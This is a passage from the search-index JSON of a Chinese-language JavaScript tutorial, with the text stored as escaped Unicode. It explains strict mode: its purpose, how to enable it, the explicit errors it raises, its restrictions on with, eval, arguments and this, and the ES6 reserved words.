\u4e25\u683c\u6a21\u5f0f\u5bf9\u52a8\u6001\u7ed1\u5b9a\u505a\u4e86\u4e00\u4e9b\u9650\u5236\u3002\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u53ea\u5141\u8bb8\u9759\u6001\u7ed1\u5b9a\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5c5e\u6027\u548c\u65b9\u6cd5\u5230\u5e95\u5f52\u5c5e\u54ea\u4e2a\u5bf9\u8c61\uff0c\u5fc5\u987b\u5728\u7f16\u8bd1\u9636\u6bb5\u5c31\u786e\u5b9a\u3002\u8fd9\u6837\u505a\u6709\u5229\u4e8e\u7f16\u8bd1\u6548\u7387\u7684\u63d0\u9ad8\uff0c\u4e5f\u4f7f\u5f97\u4ee3\u7801\u66f4\u5bb9\u6613\u9605\u8bfb\uff0c\u66f4\u5c11\u51fa\u73b0\u610f\u5916\u3002 \u5177\u4f53\u6765\u8bf4\uff0c\u6d89\u53ca\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762\u3002 \u7981\u6b62\u4f7f\u7528 with \u8bed\u53e5 \u00b6 \u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c\u4f7f\u7528 with \u8bed\u53e5\u5c06\u62a5\u9519\u3002\u56e0\u4e3a with \u8bed\u53e5\u65e0\u6cd5\u5728\u7f16\u8bd1\u65f6\u5c31\u786e\u5b9a\uff0c\u67d0\u4e2a\u5c5e\u6027\u5230\u5e95\u5f52\u5c5e\u54ea\u4e2a\u5bf9\u8c61\uff0c\u4ece\u800c\u5f71\u54cd\u4e86\u7f16\u8bd1\u6548\u679c\u3002 1 2 3 4 5 6 7 8 'use strict' ; var v = 1 ; var obj = {}; with ( obj ) { v = 2 ; } // Uncaught SyntaxError: Strict mode code may not include a with statement \u521b\u8bbe eval \u4f5c\u7528\u57df \u00b6 \u6b63\u5e38\u6a21\u5f0f\u4e0b\uff0cJavaScript \u8bed\u8a00\u6709\u4e24\u79cd\u53d8\u91cf\u4f5c\u7528\u57df\uff08scope\uff09\uff1a\u5168\u5c40\u4f5c\u7528\u57df\u548c\u51fd\u6570\u4f5c\u7528\u57df\u3002\u4e25\u683c\u6a21\u5f0f\u521b\u8bbe\u4e86\u7b2c\u4e09\u79cd\u4f5c\u7528\u57df\uff1a eval \u4f5c\u7528\u57df\u3002 \u6b63\u5e38\u6a21\u5f0f\u4e0b\uff0c eval \u8bed\u53e5\u7684\u4f5c\u7528\u57df\uff0c\u53d6\u51b3\u4e8e\u5b83\u5904\u4e8e\u5168\u5c40\u4f5c\u7528\u57df\uff0c\u8fd8\u662f\u51fd\u6570\u4f5c\u7528\u57df\u3002\u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c eval \u8bed\u53e5\u672c\u8eab\u5c31\u662f\u4e00\u4e2a\u4f5c\u7528\u57df\uff0c\u4e0d\u518d\u80fd\u591f\u5728\u5176\u6240\u8fd0\u884c\u7684\u4f5c\u7528\u57df\u521b\u8bbe\u65b0\u7684\u53d8\u91cf\u4e86\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c eval \u6240\u751f\u6210\u7684\u53d8\u91cf\u53ea\u80fd\u7528\u4e8e eval \u5185\u90e8\u3002 1 2 3 4 5 6 ( function () { 'use strict' ; var x = 2 ; console . log ( eval ( 'var x = 5; x' )) // 5 console . log ( x ) // 2 })() \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e eval \u8bed\u53e5\u5185\u90e8\u662f\u4e00\u4e2a\u72ec\u7acb\u4f5c\u7528\u57df\uff0c\u6240\u4ee5\u5185\u90e8\u7684\u53d8\u91cf x \u4e0d\u4f1a\u6cc4\u9732\u5230\u5916\u90e8\u3002 \u6ce8\u610f\uff0c\u5982\u679c\u5e0c\u671b eval \u8bed\u53e5\u4e5f\u4f7f\u7528\u4e25\u683c\u6a21\u5f0f\uff0c\u6709\u4e24\u79cd\u65b9\u5f0f\u3002 1 2 3 4 5 6 7 8 9 10 11 12 // \u65b9\u5f0f\u4e00 function f1 ( str ){ 'use strict' ; return eval ( str ); } f1 ( 'undeclared_variable = 1' ); // \u62a5\u9519 // \u65b9\u5f0f\u4e8c function f2 ( str ){ return eval ( str ); } f2 ( '\"use strict\";undeclared_variable = 1' ) // \u62a5\u9519 \u4e0a\u9762\u4e24\u79cd\u5199\u6cd5\uff0c eval \u5185\u90e8\u4f7f\u7528\u7684\u90fd\u662f\u4e25\u683c\u6a21\u5f0f\u3002 arguments \u4e0d\u518d\u8ffd\u8e2a\u53c2\u6570\u7684\u53d8\u5316 \u00b6 \u53d8\u91cf arguments \u4ee3\u8868\u51fd\u6570\u7684\u53c2\u6570\u3002\u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c\u51fd\u6570\u5185\u90e8\u6539\u53d8\u53c2\u6570\u4e0e arguments \u7684\u8054\u7cfb\u88ab\u5207\u65ad\u4e86\uff0c\u4e24\u8005\u4e0d\u518d\u5b58\u5728\u8054\u52a8\u5173\u7cfb\u3002 1 2 3 4 5 6 7 8 9 10 11 12 function f ( a ) { a = 2 ; return [ a , arguments [ 0 ]]; } f ( 1 ); // \u6b63\u5e38\u6a21\u5f0f\u4e3a[2, 2] function f ( a ) { 'use strict' ; a = 2 ; return [ a , arguments [ 0 ]]; } f ( 1 ); // \u4e25\u683c\u6a21\u5f0f\u4e3a[2, 1] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6539\u53d8\u51fd\u6570\u7684\u53c2\u6570\uff0c\u4e0d\u4f1a\u53cd\u5e94\u5230 arguments \u5bf9\u8c61\u4e0a\u6765\u3002 \u5411\u4e0b\u4e00\u4e2a\u7248\u672c\u7684 JavaScript \u8fc7\u6e21 \u00b6 JavaScript \u8bed\u8a00\u7684\u4e0b\u4e00\u4e2a\u7248\u672c\u662f ECMAScript 6\uff0c\u4e3a\u4e86\u5e73\u7a33\u8fc7\u6e21\uff0c\u4e25\u683c\u6a21\u5f0f\u5f15\u5165\u4e86\u4e00\u4e9b ES6 \u8bed\u6cd5\u3002 \u975e\u51fd\u6570\u4ee3\u7801\u5757\u4e0d\u5f97\u58f0\u660e\u51fd\u6570 \u00b6 ES6 \u4f1a\u5f15\u5165\u5757\u7ea7\u4f5c\u7528\u57df\u3002\u4e3a\u4e86\u4e0e\u65b0\u7248\u672c\u63a5\u8f68\uff0cES5 \u7684\u4e25\u683c\u6a21\u5f0f\u53ea\u5141\u8bb8\u5728\u5168\u5c40\u4f5c\u7528\u57df\u6216\u51fd\u6570\u4f5c\u7528\u57df\u58f0\u660e\u51fd\u6570\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e0d\u5141\u8bb8\u5728\u975e\u51fd\u6570\u7684\u4ee3\u7801\u5757\u5185\u58f0\u660e\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 'use strict' ; if ( true ) { function f1 () { } // \u8bed\u6cd5\u9519\u8bef } for ( var i = 0 ; i < 5 ; i ++ ) { function f2 () { } // \u8bed\u6cd5\u9519\u8bef } \u4e0a\u9762\u4ee3\u7801\u5728 if \u4ee3\u7801\u5757\u548c for \u4ee3\u7801\u5757\u4e2d\u58f0\u660e\u4e86\u51fd\u6570\uff0cES5 \u73af\u5883\u4f1a\u62a5\u9519\u3002 \u6ce8\u610f\uff0c\u5982\u679c\u662f ES6 \u73af\u5883\uff0c\u4e0a\u9762\u7684\u4ee3\u7801\u4e0d\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a ES6 \u5141\u8bb8\u5728\u4ee3\u7801\u5757\u4e4b\u4e2d\u58f0\u660e\u51fd\u6570\u3002 \u4fdd\u7559\u5b57 \u00b6 \u4e3a\u4e86\u5411\u5c06\u6765 JavaScript \u7684\u65b0\u7248\u672c\u8fc7\u6e21\uff0c\u4e25\u683c\u6a21\u5f0f\u65b0\u589e\u4e86\u4e00\u4e9b\u4fdd\u7559\u5b57\uff08implements\u3001interface\u3001let\u3001package\u3001private\u3001protected\u3001public\u3001static\u3001yield\u7b49\uff09\u3002\u4f7f\u7528\u8fd9\u4e9b\u8bcd\u4f5c\u4e3a\u53d8\u91cf\u540d\u5c06\u4f1a\u62a5\u9519\u3002 1 2 3 4 function package ( protected ) { // \u8bed\u6cd5\u9519\u8bef 'use strict' ; var implements ; // \u8bed\u6cd5\u9519\u8bef } \u53c2\u8003\u94fe\u63a5 \u00b6 MDN, Strict mode Dr. Axel Rauschmayer, JavaScript: Why the hatred for strict mode? Dr. Axel Rauschmayer\uff0c JavaScript\u2019s strict mode: a summary Douglas Crockford, Strict Mode Is Coming To Town JavaScript Strict Mode Support","title":"\u4e25\u683c\u6a21\u5f0f"},{"location":"oop/strict/#_1","text":"\u9664\u4e86\u6b63\u5e38\u7684\u8fd0\u884c\u6a21\u5f0f\uff0cJavaScript \u8fd8\u6709\u7b2c\u4e8c\u79cd\u8fd0\u884c\u6a21\u5f0f\uff1a\u4e25\u683c\u6a21\u5f0f\uff08strict mode\uff09\u3002\u987e\u540d\u601d\u4e49\uff0c\u8fd9\u79cd\u6a21\u5f0f\u91c7\u7528\u66f4\u52a0\u4e25\u683c\u7684 JavaScript \u8bed\u6cd5\u3002 \u540c\u6837\u7684\u4ee3\u7801\uff0c\u5728\u6b63\u5e38\u6a21\u5f0f\u548c\u4e25\u683c\u6a21\u5f0f\u4e2d\uff0c\u53ef\u80fd\u4f1a\u6709\u4e0d\u4e00\u6837\u7684\u8fd0\u884c\u7ed3\u679c\u3002\u4e00\u4e9b\u5728\u6b63\u5e38\u6a21\u5f0f\u4e0b\u53ef\u4ee5\u8fd0\u884c\u7684\u8bed\u53e5\uff0c\u5728\u4e25\u683c\u6a21\u5f0f\u4e0b\u5c06\u4e0d\u80fd\u8fd0\u884c\u3002","title":"\u4e25\u683c\u6a21\u5f0f"},{"location":"oop/strict/#_2","text":"\u65e9\u671f\u7684 JavaScript \u8bed\u8a00\u6709\u5f88\u591a\u8bbe\u8ba1\u4e0d\u5408\u7406\u7684\u5730\u65b9\uff0c\u4f46\u662f\u4e3a\u4e86\u517c\u5bb9\u4ee5\u524d\u7684\u4ee3\u7801\uff0c\u53c8\u4e0d\u80fd\u6539\u53d8\u8001\u7684\u8bed\u6cd5\uff0c\u53ea\u80fd\u4e0d\u65ad\u6dfb\u52a0\u65b0\u7684\u8bed\u6cd5\uff0c\u5f15\u5bfc\u7a0b\u5e8f\u5458\u4f7f\u7528\u65b0\u8bed\u6cd5\u3002 \u4e25\u683c\u6a21\u5f0f\u662f\u4ece ES5 \u8fdb\u5165\u6807\u51c6\u7684\uff0c\u4e3b\u8981\u76ee\u7684\u6709\u4ee5\u4e0b\u51e0\u4e2a\u3002 \u660e\u786e\u7981\u6b62\u4e00\u4e9b\u4e0d\u5408\u7406\u3001\u4e0d\u4e25\u8c28\u7684\u8bed\u6cd5\uff0c\u51cf\u5c11 JavaScript \u8bed\u8a00\u7684\u4e00\u4e9b\u602a\u5f02\u884c\u4e3a\u3002 \u589e\u52a0\u66f4\u591a\u62a5\u9519\u7684\u573a\u5408\uff0c\u6d88\u9664\u4ee3\u7801\u8fd0\u884c\u7684\u4e00\u4e9b\u4e0d\u5b89\u5168\u4e4b\u5904\uff0c\u4fdd\u8bc1\u4ee3\u7801\u8fd0\u884c\u7684\u5b89\u5168\u3002 \u63d0\u9ad8\u7f16\u8bd1\u5668\u6548\u7387\uff0c\u589e\u52a0\u8fd0\u884c\u901f\u5ea6\u3002 \u4e3a\u672a\u6765\u65b0\u7248\u672c\u7684 JavaScript \u8bed\u6cd5\u505a\u597d\u94fa\u57ab\u3002 \u603b\u4e4b\uff0c\u4e25\u683c\u6a21\u5f0f\u4f53\u73b0\u4e86 JavaScript \u66f4\u5408\u7406\u3001\u66f4\u5b89\u5168\u3001\u66f4\u4e25\u8c28\u7684\u53d1\u5c55\u65b9\u5411\u3002","title":"\u8bbe\u8ba1\u76ee\u7684"},{"location":"oop/strict/#_3","text":"\u8fdb\u5165\u4e25\u683c\u6a21\u5f0f\u7684\u6807\u5fd7\uff0c\u662f\u4e00\u884c\u5b57\u7b26\u4e32 use strict \u3002 1 'use strict' ; \u8001\u7248\u672c\u7684\u5f15\u64ce\u4f1a\u628a\u5b83\u5f53\u4f5c\u4e00\u884c\u666e\u901a\u5b57\u7b26\u4e32\uff0c\u52a0\u4ee5\u5ffd\u7565\u3002\u65b0\u7248\u672c\u7684\u5f15\u64ce\u5c31\u4f1a\u8fdb\u5165\u4e25\u683c\u6a21\u5f0f\u3002 \u4e25\u683c\u6a21\u5f0f\u53ef\u4ee5\u7528\u4e8e\u6574\u4e2a\u811a\u672c\uff0c\u4e5f\u53ef\u4ee5\u53ea\u7528\u4e8e\u5355\u4e2a\u51fd\u6570\u3002 \uff081\uff09 \u6574\u4e2a\u811a\u672c\u6587\u4ef6 use strict \u653e\u5728\u811a\u672c\u6587\u4ef6\u7684\u7b2c\u4e00\u884c\uff0c\u6574\u4e2a\u811a\u672c\u90fd\u5c06\u4ee5\u4e25\u683c\u6a21\u5f0f\u8fd0\u884c\u3002\u5982\u679c\u8fd9\u884c\u8bed\u53e5\u4e0d\u5728\u7b2c\u4e00\u884c\u5c31\u65e0\u6548\uff0c\u6574\u4e2a\u811a\u672c\u4f1a\u4ee5\u6b63\u5e38\u6a21\u5f0f\u8fd0\u884c\u3002(\u4e25\u683c\u5730\u8bf4\uff0c\u53ea\u8981\u524d\u9762\u4e0d\u662f\u4ea7\u751f\u5b9e\u9645\u8fd0\u884c\u7ed3\u679c\u7684\u8bed\u53e5\uff0c use strict \u53ef\u4ee5\u4e0d\u5728\u7b2c\u4e00\u884c\uff0c\u6bd4\u5982\u76f4\u63a5\u8ddf\u5728\u4e00\u4e2a\u7a7a\u7684\u5206\u53f7\u540e\u9762\uff0c\u6216\u8005\u8ddf\u5728\u6ce8\u91ca\u540e\u9762\u3002) 1 2 3 4 5 6 7 8 < script > 'use strict' ; console . log ( '\u8fd9\u662f\u4e25\u683c\u6a21\u5f0f' ); </ script > < script > console . log ( '\u8fd9\u662f\u6b63\u5e38\u6a21\u5f0f' ); </ script > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e00\u4e2a\u7f51\u9875\u6587\u4ef6\u4f9d\u6b21\u6709\u4e24\u6bb5 JavaScript \u4ee3\u7801\u3002\u524d\u4e00\u4e2a <script> \u6807\u7b7e\u662f\u4e25\u683c\u6a21\u5f0f\uff0c\u540e\u4e00\u4e2a\u4e0d\u662f\u3002 \u5982\u679c use strict \u5199\u6210\u4e0b\u9762\u8fd9\u6837\uff0c\u5219\u4e0d\u8d77\u4f5c\u7528\uff0c\u4e25\u683c\u6a21\u5f0f\u5fc5\u987b\u4ece\u4ee3\u7801\u4e00\u5f00\u59cb\u5c31\u751f\u6548\u3002 1 2 3 4 < script > console . log ( '\u8fd9\u662f\u6b63\u5e38\u6a21\u5f0f' ); 'use strict' ; </ script > \uff082\uff09\u5355\u4e2a\u51fd\u6570 use strict \u653e\u5728\u51fd\u6570\u4f53\u7684\u7b2c\u4e00\u884c\uff0c\u5219\u6574\u4e2a\u51fd\u6570\u4ee5\u4e25\u683c\u6a21\u5f0f\u8fd0\u884c\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function strict () { 'use strict' ; return '\u8fd9\u662f\u4e25\u683c\u6a21\u5f0f' ; } function strict2 () { 'use strict' ; function f () { return '\u8fd9\u4e5f\u662f\u4e25\u683c\u6a21\u5f0f' ; } return f (); } function notStrict () { return '\u8fd9\u662f\u6b63\u5e38\u6a21\u5f0f' ; } \u6709\u65f6\uff0c\u9700\u8981\u628a\u4e0d\u540c\u7684\u811a\u672c\u5408\u5e76\u5728\u4e00\u4e2a\u6587\u4ef6\u91cc\u9762\u3002\u5982\u679c\u4e00\u4e2a\u811a\u672c\u662f\u4e25\u683c\u6a21\u5f0f\uff0c\u53e6\u4e00\u4e2a\u811a\u672c\u4e0d\u662f\uff0c\u5b83\u4eec\u7684\u5408\u5e76\u5c31\u53ef\u80fd\u51fa\u9519\u3002\u4e25\u683c\u6a21\u5f0f\u7684\u811a\u672c\u5728\u524d\uff0c\u5219\u5408\u5e76\u540e\u7684\u811a\u672c\u90fd\u662f\u4e25\u683c\u6a21\u5f0f\uff1b\u5982\u679c\u6b63\u5e38\u6a21\u5f0f\u7684\u811a\u672c\u5728\u524d\uff0c\u5219\u5408\u5e76\u540e\u7684\u811a\u672c\u90fd\u662f\u6b63\u5e38\u6a21\u5f0f\u3002\u8fd9\u4e24\u79cd\u60c5\u51b5\u4e0b\uff0c\u5408\u5e76\u540e\u7684\u7ed3\u679c\u90fd\u662f\u4e0d\u6b63\u786e\u7684\u3002\u8fd9\u65f6\u53ef\u4ee5\u8003\u8651\u628a\u6574\u4e2a\u811a\u672c\u6587\u4ef6\u653e\u5728\u4e00\u4e2a\u7acb\u5373\u6267\u884c\u7684\u533f\u540d\u51fd\u6570\u4e4b\u4e2d\u3002 1 2 3 4 ( function () { 'use strict' ; // some code here })();","title":"\u542f\u7528\u65b9\u6cd5"},{"location":"oop/strict/#_4","text":"\u4e25\u683c\u6a21\u5f0f\u4f7f\u5f97 JavaScript \u7684\u8bed\u6cd5\u53d8\u5f97\u66f4\u4e25\u683c\uff0c\u66f4\u591a\u7684\u64cd\u4f5c\u4f1a\u663e\u5f0f\u62a5\u9519\u3002\u5176\u4e2d\u6709\u4e9b\u64cd\u4f5c\uff0c\u5728\u6b63\u5e38\u6a21\u5f0f\u4e0b\u53ea\u4f1a\u9ed8\u9ed8\u5730\u5931\u8d25\uff0c\u4e0d\u4f1a\u62a5\u9519\u3002","title":"\u663e\u5f0f\u62a5\u9519"},{"location":"oop/strict/#_5","text":"\u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c\u8bbe\u7f6e\u5b57\u7b26\u4e32\u7684 length \u5c5e\u6027\uff0c\u4f1a\u62a5\u9519\u3002 1 2 3 'use strict' ; 'abc' . length = 5 ; // TypeError: Cannot assign to read only property 'length' of string 'abc' \u4e0a\u9762\u4ee3\u7801\u62a5\u9519\uff0c\u56e0\u4e3a length \u662f\u53ea\u8bfb\u5c5e\u6027\uff0c\u4e25\u683c\u6a21\u5f0f\u4e0b\u4e0d\u53ef\u5199\u3002\u6b63\u5e38\u6a21\u5f0f\u4e0b\uff0c\u6539\u53d8 length \u5c5e\u6027\u662f\u65e0\u6548\u7684\uff0c\u4f46\u4e0d\u4f1a\u62a5\u9519\u3002 \u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c\u5bf9\u53ea\u8bfb\u5c5e\u6027\u8d4b\u503c\uff0c\u6216\u8005\u5220\u9664\u4e0d\u53ef\u914d\u7f6e\uff08non-configurable\uff09\u5c5e\u6027\u90fd\u4f1a\u62a5\u9519\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // \u5bf9\u53ea\u8bfb\u5c5e\u6027\u8d4b\u503c\u4f1a\u62a5\u9519 'use strict' ; Object . defineProperty ({}, 'a' , { value : 37 , writable : false }); obj . a = 123 ; // TypeError: Cannot assign to read only property 'a' of object #<Object> // \u5220\u9664\u4e0d\u53ef\u914d\u7f6e\u7684\u5c5e\u6027\u4f1a\u62a5\u9519 'use strict' ; var obj = Object . defineProperty ({}, 'p' , { value : 1 , configurable : false }); delete obj . p // TypeError: Cannot delete property 'p' of #<Object>","title":"\u53ea\u8bfb\u5c5e\u6027\u4e0d\u53ef\u5199"},{"location":"oop/strict/#_6","text":"\u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c\u5bf9\u4e00\u4e2a\u53ea\u6709\u53d6\u503c\u5668\uff08getter\uff09\u3001\u6ca1\u6709\u5b58\u503c\u5668\uff08setter\uff09\u7684\u5c5e\u6027\u8d4b\u503c\uff0c\u4f1a\u62a5\u9519\u3002 1 2 3 4 5 6 'use strict' ; var obj = { get v () { return 1 ; } }; obj . v = 2 ; // Uncaught TypeError: Cannot set property v of #<Object> which has only a getter \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj.v \u53ea\u6709\u53d6\u503c\u5668\uff0c\u6ca1\u6709\u5b58\u503c\u5668\uff0c\u5bf9\u5b83\u8fdb\u884c\u8d4b\u503c\u5c31\u4f1a\u62a5\u9519\u3002","title":"\u53ea\u8bbe\u7f6e\u4e86\u53d6\u503c\u5668\u7684\u5c5e\u6027\u4e0d\u53ef\u5199"},{"location":"oop/strict/#_7","text":"\u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c\u5bf9\u7981\u6b62\u6269\u5c55\u7684\u5bf9\u8c61\u6dfb\u52a0\u65b0\u5c5e\u6027\uff0c\u4f1a\u62a5\u9519\u3002 1 2 3 4 5 'use strict' ; var obj = {}; Object . preventExtensions ( obj ); obj . v = 1 ; // Uncaught TypeError: Cannot add property v, object is not extensible \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c obj \u5bf9\u8c61\u7981\u6b62\u6269\u5c55\uff0c\u6dfb\u52a0\u5c5e\u6027\u5c31\u4f1a\u62a5\u9519\u3002","title":"\u7981\u6b62\u6269\u5c55\u7684\u5bf9\u8c61\u4e0d\u53ef\u6269\u5c55"},{"location":"oop/strict/#evalarguments","text":"\u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c\u4f7f\u7528 eval \u6216\u8005 arguments \u4f5c\u4e3a\u6807\u8bc6\u540d\uff0c\u5c06\u4f1a\u62a5\u9519\u3002\u4e0b\u9762\u7684\u8bed\u53e5\u90fd\u4f1a\u62a5\u9519\u3002 1 2 3 4 5 6 7 8 9 10 'use strict' ; var eval = 17 ; var arguments = 17 ; var obj = { set p ( arguments ) { } }; try { } catch ( arguments ) { } function x ( eval ) { } function arguments () { } var y = function eval () { }; var f = new Function ( 'arguments' , \"'use strict'; return 17;\" ); // SyntaxError: Unexpected eval or arguments in strict mode","title":"eval\u3001arguments \u4e0d\u53ef\u7528\u4f5c\u6807\u8bc6\u540d"},{"location":"oop/strict/#_8","text":"\u6b63\u5e38\u6a21\u5f0f\u4e0b\uff0c\u5982\u679c\u51fd\u6570\u6709\u591a\u4e2a\u91cd\u540d\u7684\u53c2\u6570\uff0c\u53ef\u4ee5\u7528 arguments[i] \u8bfb\u53d6\u3002\u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c\u8fd9\u5c5e\u4e8e\u8bed\u6cd5\u9519\u8bef\u3002 1 2 3 4 5 function f ( a , a , b ) { 'use strict' ; return a + b ; } // Uncaught SyntaxError: Duplicate parameter name not allowed in this context","title":"\u51fd\u6570\u4e0d\u80fd\u6709\u91cd\u540d\u7684\u53c2\u6570"},{"location":"oop/strict/#0","text":"\u6b63\u5e38\u6a21\u5f0f\u4e0b\uff0c\u6574\u6570\u7684\u7b2c\u4e00\u4f4d\u5982\u679c\u662f 0 \uff0c\u8868\u793a\u8fd9\u662f\u516b\u8fdb\u5236\u6570\uff0c\u6bd4\u5982 0100 \u7b49\u4e8e\u5341\u8fdb\u5236\u768464\u3002\u4e25\u683c\u6a21\u5f0f\u7981\u6b62\u8fd9\u79cd\u8868\u793a\u6cd5\uff0c\u6574\u6570\u7b2c\u4e00\u4f4d\u4e3a 0 \uff0c\u5c06\u62a5\u9519\u3002 1 2 3 'use strict' ; var n = 0100 ; // Uncaught SyntaxError: Octal literals are not allowed in strict mode.","title":"\u7981\u6b62\u516b\u8fdb\u5236\u7684\u524d\u7f000\u8868\u793a\u6cd5"},{"location":"oop/strict/#_9","text":"\u4e25\u683c\u6a21\u5f0f\u589e\u5f3a\u4e86\u5b89\u5168\u4fdd\u62a4\uff0c\u4ece\u8bed\u6cd5\u4e0a\u9632\u6b62\u4e86\u4e00\u4e9b\u4e0d\u5c0f\u5fc3\u4f1a\u51fa\u73b0\u7684\u9519\u8bef\u3002","title":"\u589e\u5f3a\u7684\u5b89\u5168\u63aa\u65bd"},{"location":"oop/strict/#_10","text":"\u6b63\u5e38\u6a21\u5f0f\u4e2d\uff0c\u5982\u679c\u4e00\u4e2a\u53d8\u91cf\u6ca1\u6709\u58f0\u660e\u5c31\u8d4b\u503c\uff0c\u9ed8\u8ba4\u662f\u5168\u5c40\u53d8\u91cf\u3002\u4e25\u683c\u6a21\u5f0f\u7981\u6b62\u8fd9\u79cd\u7528\u6cd5\uff0c\u5168\u5c40\u53d8\u91cf\u5fc5\u987b\u663e\u5f0f\u58f0\u660e\u3002 1 2 3 4 5 6 7 8 9 10 11 12 'use strict' ; v = 1 ; // \u62a5\u9519\uff0cv\u672a\u58f0\u660e for ( i = 0 ; i < 2 ; i ++ ) { // \u62a5\u9519\uff0ci \u672a\u58f0\u660e // ... } function f () { x = 123 ; } f () // \u62a5\u9519\uff0c\u672a\u58f0\u660e\u5c31\u521b\u5efa\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf \u56e0\u6b64\uff0c\u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c\u53d8\u91cf\u90fd\u5fc5\u987b\u5148\u58f0\u660e\uff0c\u7136\u540e\u518d\u4f7f\u7528\u3002","title":"\u5168\u5c40\u53d8\u91cf\u663e\u5f0f\u58f0\u660e"},{"location":"oop/strict/#this","text":"\u6b63\u5e38\u6a21\u5f0f\u4e0b\uff0c\u51fd\u6570\u5185\u90e8\u7684 this \u53ef\u80fd\u4f1a\u6307\u5411\u5168\u5c40\u5bf9\u8c61\uff0c\u4e25\u683c\u6a21\u5f0f\u7981\u6b62\u8fd9\u79cd\u7528\u6cd5\uff0c\u907f\u514d\u65e0\u610f\u95f4\u521b\u9020\u5168\u5c40\u53d8\u91cf\u3002 1 2 3 4 5 6 7 8 9 10 11 12 // \u6b63\u5e38\u6a21\u5f0f function f () { console . log ( this === window ); } f () // true // \u4e25\u683c\u6a21\u5f0f function f () { 'use strict' ; console . log ( this === undefined ); } f () // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e25\u683c\u6a21\u5f0f\u7684\u51fd\u6570\u4f53\u5185\u90e8 this \u662f undefined \u3002 \u8fd9\u79cd\u9650\u5236\u5bf9\u4e8e\u6784\u9020\u51fd\u6570\u5c24\u5176\u6709\u7528\u3002\u4f7f\u7528\u6784\u9020\u51fd\u6570\u65f6\uff0c\u6709\u65f6\u5fd8\u4e86\u52a0 new \uff0c\u8fd9\u65f6 this \u4e0d\u518d\u6307\u5411\u5168\u5c40\u5bf9\u8c61\uff0c\u800c\u662f\u62a5\u9519\u3002 1 2 3 4 5 6 function f () { 'use strict' ; this . a = 1 ; }; f (); // \u62a5\u9519\uff0cthis \u672a\u5b9a\u4e49 \u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c\u51fd\u6570\u76f4\u63a5\u8c03\u7528\u65f6\uff08\u4e0d\u4f7f\u7528 new \u8c03\u7528\uff09\uff0c\u51fd\u6570\u5185\u90e8\u7684 this \u8868\u793a undefined \uff08\u672a\u5b9a\u4e49\uff09\uff0c\u56e0\u6b64\u53ef\u4ee5\u7528 call \u3001 apply \u548c bind \u65b9\u6cd5\uff0c\u5c06\u4efb\u610f\u503c\u7ed1\u5b9a\u5728 this \u4e0a\u9762\u3002\u6b63\u5e38\u6a21\u5f0f\u4e0b\uff0c this \u6307\u5411\u5168\u5c40\u5bf9\u8c61\uff0c\u5982\u679c\u7ed1\u5b9a\u7684\u503c\u662f\u975e\u5bf9\u8c61\uff0c\u5c06\u88ab\u81ea\u52a8\u8f6c\u4e3a\u5bf9\u8c61\u518d\u7ed1\u5b9a\u4e0a\u53bb\uff0c\u800c null \u548c undefined \u8fd9\u4e24\u4e2a\u65e0\u6cd5\u8f6c\u6210\u5bf9\u8c61\u7684\u503c\uff0c\u5c06\u88ab\u5ffd\u7565\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // \u6b63\u5e38\u6a21\u5f0f function fun () { return this ; } fun () // window fun . call ( 2 ) // Number {2} fun . call ( true ) // Boolean {true} fun . call ( null ) // window fun . call ( undefined ) // window // \u4e25\u683c\u6a21\u5f0f 'use strict' ; function fun () { return this ; } fun () //undefined fun . call ( 2 ) // 2 fun . call ( true ) // true fun . call ( null ) // null fun . call ( undefined ) // undefined \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53ef\u4ee5\u628a\u4efb\u610f\u7c7b\u578b\u7684\u503c\uff0c\u7ed1\u5b9a\u5728 this \u4e0a\u9762\u3002","title":"\u7981\u6b62 this \u5173\u952e\u5b57\u6307\u5411\u5168\u5c40\u5bf9\u8c61"},{"location":"oop/strict/#fncalleefncaller","text":"\u51fd\u6570\u5185\u90e8\u4e0d\u5f97\u4f7f\u7528 fn.caller \u3001 fn.arguments \uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002\u8fd9\u610f\u5473\u7740\u4e0d\u80fd\u5728\u51fd\u6570\u5185\u90e8\u5f97\u5230\u8c03\u7528\u6808\u4e86\u3002 1 2 3 4 5 6 7 function f1 () { 'use strict' ; f1 . caller ; // \u62a5\u9519 f1 . arguments ; // \u62a5\u9519 } f1 ();","title":"\u7981\u6b62\u4f7f\u7528 fn.callee\u3001fn.caller"},{"location":"oop/strict/#argumentscalleeargumentscaller","text":"arguments.callee \u548c arguments.caller 